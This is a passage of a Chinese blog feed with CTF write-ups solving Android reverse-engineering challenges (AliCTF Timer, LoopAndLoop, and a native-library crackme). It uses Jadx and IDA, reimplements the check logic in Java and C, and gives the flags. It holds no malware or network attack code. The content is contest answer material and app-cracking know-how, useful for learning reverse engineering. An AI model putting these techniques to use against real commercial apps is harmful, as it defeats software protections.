&lt;p&gt;使用Jadx反编译样本，刚开始看着代码感觉有点怪怪的，看了一会，整理了逻辑，使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postDelayed()&lt;/code&gt;循环执行，间隔为1s&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A952305A1B448126848D29C4375BF505.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;is2()&lt;/code&gt;函数用于判断素数&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/66B05C4052372323B1D07444DF356737.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那么在去掉其余代码，总结就是：循环200000次，然后循环的时候进行素数判断，根据判断的结果进行不同的操作&lt;/p&gt;

&lt;p&gt;Java还原&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package test;

public class Main {
	
	public static void main(String[] args) throws Exception{
		int beg = 200000;
		int k = 0;
		int i;
		for(i = beg; i &amp;gt; 0; i--){
	        if(is2(beg - i)) {
	            k += 100;
	        } else {
	            k--;
	        }
		}
		System.out.println(Integer.toString(k));
		System.out.println(&quot;Finish!&quot;);
	}
		
	public static boolean is2(long l) {
        if (l &amp;lt;= 3) {
            if (l &amp;gt; 1) {
                return true;
            }
            return false;
        } else if (l % 2 == 0 || l % 3 == 0) {
            return false;
        } else {
            int i = 5;
            while (i * i &amp;lt;= l) {
                if (l % i == 0 || l % (i + 2) == 0) {
                    return false;
                }
                i += 6;
            }
            return true;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跑出结果&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1616384
Finish!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么这个数字传入&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public native String stringFromJNI2(int i);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这是一个native方法，小书包里掏出IDA&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1BCF7CB3C3DE1E8AD5CBBF26FC79D93B.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我去，一堆除和余，分析太费劲，反正没有其它的干扰了，写个APP自己调用这个so&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package net.bluelotus.tomorrow.easyandroid;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import com.wnagzihxain.demo.R;

public class MainActivity extends AppCompatActivity {

    static {
        System.loadLibrary(&quot;lhm&quot;);
    }

    public native String stringFromJNI2(int number);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
//        Toast.makeText(this, stringFromJNI2(1616384), Toast.LENGTH_LONG).show();
        Log.i(&quot;wnagzihxa1n&quot;, stringFromJNI2(1616384));
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;有几点要注意&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;so直接放&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/main/&lt;/code&gt;目录下的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jniLibs&lt;/code&gt;，没有就自己创建，记得把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;armeabi&lt;/code&gt;带上&lt;/li&gt;
  &lt;li&gt;调用类的路径需要和so里描述的一样，不然会找不到方法&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int __fastcall Java_net_bluelotus_tomorrow_easyandroid_MainActivity_stringFromJNI2(int a1, int a2, signed int a3)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;最后看一下完整的路径结构，这种调用so的方法不需要修改&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;build.gradle&lt;/code&gt;，虽然不建议&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3567CF4DB2E2E02DCE02F53EF01075ED.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;跑起来，输出Flag&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;03-28 09:02:21.066 25084-25084/com.wnagzihxain.demo I/wnagzihxa1n: Y0vAr3TimerMa3te7
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;毕竟才50分，还要分析so那简直太折腾，还是走捷径比较好，要是想锻炼so分析能力的同学可以去折腾一下&lt;/p&gt;
</description>
                <pubDate>Wed, 15 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/15/2016-AliCTF-Timer-50.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/15/2016-AliCTF-Timer-50.html</guid>
            </item>
        
            <item>
                <title>2016 AliCTF - LoopAndLoop-100</title>
                <description>&lt;p&gt;2016年阿里CTF的第二道Mobile题，分值100&lt;/p&gt;

&lt;p&gt;Jadx打开，发现关键的代码在这里&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F93F246F4C4FD2D161488E8FCEDAD557.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check()&lt;/code&gt;函数的定义&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public int check(int input, int s) {
    return chec(input, s);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chec()&lt;/code&gt;函数为native函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public native int chec(int i, int i2);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;IDA载入对应so，修复一些类型并且重命名一些变量&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A6F5D60EE377F30BEAA801768EE5AE93.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;逻辑很简单，我们输入数据，然后通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check()&lt;/code&gt;各种调用，在native中判断第二个参数，第二个参数传入的是99，并且获取了Java层的三个函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check1()&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check2()&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check3()&lt;/code&gt;的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MethodID&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;接下来进行判断，通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Num_99&lt;/code&gt;的值调用不同的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check*()&lt;/code&gt;函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if ( Num_99 - 1 &amp;lt;= 0 )
    result = vInput;
else
    result = _JNIEnv::CallIntMethod(vEnv, jobject, (int)*(&amp;amp;jMethodID_check1 + 2 * Num_99 % 3), vInput);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们回过头看Java层的三个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check*()&lt;/code&gt;函数，它们其实这只是做了加加减减的操作而已，然后再回头调用naive层的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chec()&lt;/code&gt;，或者说，这其实就是个等差数列的求和&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check1()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public int check1(int input, int s) {
    int t = input;
    for (int i = 1; i &amp;lt; 100; i++) {
        t += i;
    }
    return chec(t, s);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check2()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public int check2(int input, int s) {
    int t = input;
    int i;
    if (s % 2 == 0) {
        for (i = 1; i &amp;lt; 1000; i++) {
            t += i;
        }
        return chec(t, s);
    }
    for (i = 1; i &amp;lt; 1000; i++) {
        t -= i;
    }
    return chec(t, s);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check3()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public int check3(int input, int s) {
    int t = input;
    for (int i = 1; i &amp;lt; 10000; i++) {
        t += i;
    }
    return chec(t, s);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;有一点奇怪的是，在所有代码中，我们并没有发现&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Num_99&lt;/code&gt;参数的对应操作，比如减1，减2等，如果这个参数不变化，递归过程就要爆栈了&lt;/p&gt;

&lt;p&gt;再次回过头看native代码，这个函数调用了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check*()&lt;/code&gt;，但是每个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check*()&lt;/code&gt;函数都是有2个参数的，加上默认的3个应该是5个，但是这里只是显示了四个&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int __fastcall _JNIEnv::CallIntMethod(JNIEnv *env, jobject jobject, int a3, int a4)
{
    int varg_r3; // [sp+14h] [bp-4h]@1

    varg_r3 = a4;
    return (*env)-&amp;gt;CallIntMethodV(env, jobject, (jmethodID)a3, (int **__attribute__((__org_typedef(va_list))) )&amp;amp;varg_r3);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们知道，ARM传递参数会使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;R0-R3&lt;/code&gt;，如果多的参数则使用栈传递，那么这里第5个参数是必然要使用栈传递了，我们观察最后一个压栈操作即可，最后一个压栈的操作是对R6寄存器进行处理，先减1，然后判断小于等于0，最后压栈进行参数传递，有一点要注意的是，R3是第三个参数，这个参数保存在栈中，为减1前的数据&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/122CB32BA54CFDF878401B91ADF6333A.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也就是说，在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2 * Num_99 % 3&lt;/code&gt;的时候，还未减一，而传递的参数为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Num_99 - 1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;相当于&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;result = _JNIEnv::CallIntMethod(vEnv, jobject, (int)*(&amp;amp;jMethodID_check1 + 2 * Num_99 % 3), vInput, Num99 - 1);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么接下来就看高中数列学的好不好了&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package test;

import java.awt.geom.Ellipse2D;

public class Main {
	
	public static void main(String[] args) throws Exception{
		int output = 1835996258;
		for(int i = 2; i &amp;lt;= 99; i++) {
			if((2 * i % 3) == 0) {
				output = check1(output, i - 1);
			} else if((2 * i % 3) == 1) {
				output = check2(output, i - 1);
			} else {
				output = check3(output, i - 1);
			}
		}
		System.out.println(Integer.toString(output));
	}

    public static int check1(int input, int s) {
        int t = input;
        for (int i = 1; i &amp;lt; 100; i++) {
            t -= i;
        }
        return t;
    }

    public static int check2(int input, int s) {
        int t = input;
        int i;
        if (s % 2 == 0) {
            for (i = 1; i &amp;lt; 1000; i++) {
                t -= i;
            }
            return t;
        }
        for (i = 1; i &amp;lt; 1000; i++) {
            t += i;
        }
        return t;
    }

    public static int check3(int input, int s) {
        int t = input;
        for (int i = 1; i &amp;lt; 10000; i++) {
            t -= i;
        }
        return t;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我知道等差数列可以求和，我懒&lt;/p&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;236492408
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在APP中输入这串数字&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/8ADC51DAD7EBA9A3552357D18E451D17.jpg&quot; alt=&quot;4.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Flag：alictf{Jan6N100p3r}&lt;/p&gt;

&lt;p&gt;如果有看过FlappyPig战队WriteUp的同学应该看到了先算再减的解法，我只是比他们更懒一点而已&lt;/p&gt;
</description>
                <pubDate>Wed, 15 Mar 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/03/15/2016-AliCTF-LoopAndLoop-100.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/03/15/2016-AliCTF-LoopAndLoop-100.html</guid>
            </item>
        
            <item>
                <title>2015海峡两岸CTF - 一个APK逆向试试吧</title>
                <description>&lt;p&gt;一道比较简单的题目&lt;/p&gt;

&lt;p&gt;JEB里可以看出，调用了一个so，把输入的字符串传进so里的一个函数进行验证，验证成功弹出输入的字符串，相当于字符串就是Flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/D951F4222649B4A4D9B1AB982AE80E52.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用IDA载入so，发现有&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNI_OnLoad()&lt;/code&gt;，猜测有动态注册，跟入&lt;/p&gt;

&lt;p&gt;找到动态注册的函数表&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/86202CD7C10C85C4D039AFCF7FD94E6F.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;每个Item有三个数据下面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hello()&lt;/code&gt;函数并没有什么实际意义，重点是上面这个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghijklmn()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.data:7386400C off_7386400C    DCD aTestflag           ; DATA XREF: JNI_OnLoad+68o
.data:7386400C                                         ; .text:off_73861258o
.data:7386400C                                         ; &quot;testFlag&quot;
.data:73864010                 DCD aLjavaLangStr_0     ; &quot;(Ljava/lang/String;)Z&quot;
.data:73864014                 DCD abcdefghijklmn+1
.data:73864018                 DCD aHello              ; &quot;hello&quot;
.data:7386401C                 DCD aLjavaLangStr_1     ; &quot;()Ljava/lang/String;&quot;
.data:73864020                 DCD native_hello+1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;明确这里是动态注册后，双击&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghijklmn()&lt;/code&gt;过去修改函数名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java_com_testFlag()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;首先对长度进行判断，长度必须&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt;，也就是16字节&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:73861022                 BLX     strlen
.text:73861026                 MOVS    R4, #0
.text:73861028                 CMP     R0, #0x10
.text:7386102A                 BEQ     loc_7386102E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在判断完长度后，如果长度为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt;，进入第一个循环计算，此时R6相当于计数器，起始为0，到8结束，也就是循环八次，R2为传入字符串的首地址，然后计算出结果存储在s2里&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:73861030
.text:73861030 loc_73861030
.text:73861030                 LDR     R2, [SP,#8]
.text:73861032                 ADD     R1, SP, #20 ; s2
.text:73861034                 LDRB    R3, [R2,R6]
.text:73861036                 SUBS    R3, R3, R6
.text:73861038                 STRB    R3, [R6,R1]
.text:7386103A                 ADDS    R6, #1
.text:7386103C                 CMP     R6, #8
.text:7386103E                 BNE     loc_73861
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;总结就是&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for (int i = 0; i &amp;lt; 8; i++)
{
	s2[i] = input[i] - i;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;计算完前8字节的数据后，获取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;seed&lt;/code&gt;字符串进行对比&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:73861040                 LDR     R3, =(seed_ptr - 0x7386104A)
.text:73861042                 MOVS    R4, #0
.text:73861044                 STRB    R4, [R1,#8]
.text:73861046                 ADD     R3, PC ; seed_ptr
.text:73861048                 LDR     R3, [R3] ; seed
.text:7386104A                 LDR     R0, [R3] ; s1
.text:7386104C                 BLX     strcmp
.text:73861050                 CMP     R0, R4
.text:73861052                 BNE     loc_7386111E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;seed&lt;/code&gt;字符串的定义&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.data:00004004 A5 28 00 00 seed            DCD aQflmnFh            ; DATA XREF: Java_com_testFlag+64o
.data:00004004                                                     ; __init_my+Co ...
.data:00004004                                                     ; &quot;QflMn`fH&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第一部分对比成功，进入第二部分的对比，先获取Java层的一个Class&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001054 LDR     R0, [R5]
.text:00001056 LDR     R1, =(aComExampleMobi - 0x105E)
.text:00001058 LDR     R3, [R0]
.text:0000105A ADD     R1, PC          ; &quot;com/example/mobicrackndk/Calc&quot;
.text:0000105C LDR     R3, [R3,#JNINativeInterface.FindClass]
.text:0000105E BLX     R3
.text:00001060 STR     R0, [SP,#0xC8+jclass_Calc]
.text:00001062 CMP     R0, R4
.text:00001064 BNE     loc_1070
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取类&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Calc&lt;/code&gt;的方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calcKey()&lt;/code&gt;的MethodID&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:00001070
.text:00001070 loc_1070
.text:00001070 LDR     R0, [R5]
.text:00001072 LDR     R2, =(aCalckey - 0x1080)
.text:00001074 LDR     R3, =(aV - 0x1084)
.text:00001076 LDR     R4, [R0]
.text:00001078 MOVS    R1, #JNINativeInterface.GetStaticMethodID
.text:0000107C ADD     R2, PC          ; &quot;calcKey&quot;
.text:0000107E LDR     R4, [R4,R1]
.text:00001080 ADD     R3, PC          ; &quot;()V&quot;
.text:00001082 LDR     R1, [SP,#0xC8+jclass_Calc]
.text:00001084 BLX     R4
.text:00001086 SUBS    R2, R0, #0
.text:00001088 BNE     loc_109E
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取类&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Calc&lt;/code&gt;的方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calcKey()&lt;/code&gt;的字段&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt;的FieldID&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:0000109E
.text:0000109E loc_109E
.text:0000109E LDR     R0, [R5]
.text:000010A0 LDR     R1, [SP,#0xC8+jclass_Calc]
.text:000010A2 BL      _ZN7_JNIEnv20CallStaticVoidMethodEP7_jclassP10_jmethodIDz ; _JNIEnv::CallStaticVoidMethod(_jclass *,_jmethodID *,...)
.text:000010A6 LDR     R0, [R7]
.text:000010A8 LDR     R2, =(aKey - 0x10B6)
.text:000010AA LDR     R3, =(aLjavaLangStrin - 0x10B8)
.text:000010AC MOVS    R1, #JNINativeInterface.GetStaticFieldID
.text:000010B0 LDR     R4, [R0,R1]
.text:000010B2 ADD     R2, PC          ; &quot;key&quot;
.text:000010B4 ADD     R3, PC          ; &quot;Ljava/lang/String;&quot;
.text:000010B6 MOVS    R0, R7
.text:000010B8 LDR     R1, [SP,#0xC8+jclass_Calc]
.text:000010BA BLX     R4
.text:000010BC SUBS    R4, R0, #0
.text:000010BE BNE     loc_10CE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过FieldID获取Field，并将Java的String类型数据转为C语言的char字符串数组&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:000010CE
.text:000010CE loc_10CE
.text:000010CE LDR     R2, [R7]
.text:000010D0 MOVS    R3, #JNINativeInterface.GetStaticObjectField
.text:000010D4 LDR     R3, [R2,R3]
.text:000010D6 LDR     R1, [SP,#0xC8+jclass_Calc]
.text:000010D8 MOVS    R2, R4
.text:000010DA MOVS    R0, R7
.text:000010DC BLX     R3
.text:000010DE MOVS    R1, R0
.text:000010E0 LDR     R0, [R5]
.text:000010E2 MOVS    R2, #JNINativeInterface.GetStringUTFChars
.text:000010E6 LDR     R3, [R0]
.text:000010E8 ADD     R4, SP, #0xC8+s3
.text:000010EA LDR     R3, [R3,R2]
.text:000010EC MOVS    R2, #0
.text:000010EE BLX     R3
.text:000010F0 MOVS    R5, R0
.text:000010F2 B       loc_1102
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;进入第二部分的计算循环，计算规则和第一部分一样&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4039E90A2196A291D893BD4A8C895173.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;还原一下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for (int i = 8; i &amp;lt; 16; i++)
{
	s3[i - 8] = input[i] - i;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将两部分进行对比&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.text:0000110E MOVS    R3, #0
.text:00001110 STRB    R3, [R4,#8]
.text:00001112 MOVS    R1, R4          ; s2
.text:00001114 MOVS    R0, R5          ; s1
.text:00001116 BLX     strcmp
.text:0000111A NEGS    R4, R0
.text:0000111C ADCS    R4, R0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;总结整个对比过程：将输入的16字节字符串进行处理，然后使用两个8字节字符串与处理过后的输入数据进行对比&lt;/p&gt;

&lt;p&gt;写个小程序来处理一下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;cstring&amp;gt;
#include &amp;lt;iostream&amp;gt;

using namespace std;

int main()
{
	char temp1[17] = &quot;QflMn`fH,ZHVW^7c&quot;;
	for(int i = 0; i &amp;lt; 16; i++)
	{
		printf(&quot;%c&quot;, temp1[i] + i);
	}
	printf(&quot;\n&quot;);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;QgnPrelO4cRackEr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;把这串字符串输入CrackMe进入验证，弹出&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wrong Flag&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;纳尼？？？？？？&lt;/p&gt;

&lt;p&gt;再回过头来分析，可能是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNI_OnLoad()&lt;/code&gt;里有什么函数对字符串进行了修改，刚才分析并没有注意到&lt;/p&gt;

&lt;p&gt;可惜除了注册函数之外并没有其余调用函数的操作，那么现在就只可能在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.init_array&lt;/code&gt;段了&lt;/p&gt;

&lt;p&gt;找到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.init_array&lt;/code&gt;段，果然在这里调用了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__init_my()&lt;/code&gt;函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.init_array:00003E78             ; ===========================================================================
.init_array:00003E78
.init_array:00003E78             ; Segment type: Pure data
.init_array:00003E78                             AREA .init_array, DATA
.init_array:00003E78                             ; ORG 0x3E78
.init_array:00003E78 6D 11 00 00                 DCD __init_my+1
.init_array:00003E7C 00 00 00 00                 ALIGN 0x10
.init_array:00003E7C             ; .init_array   ends
.init_array:00003E7C
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

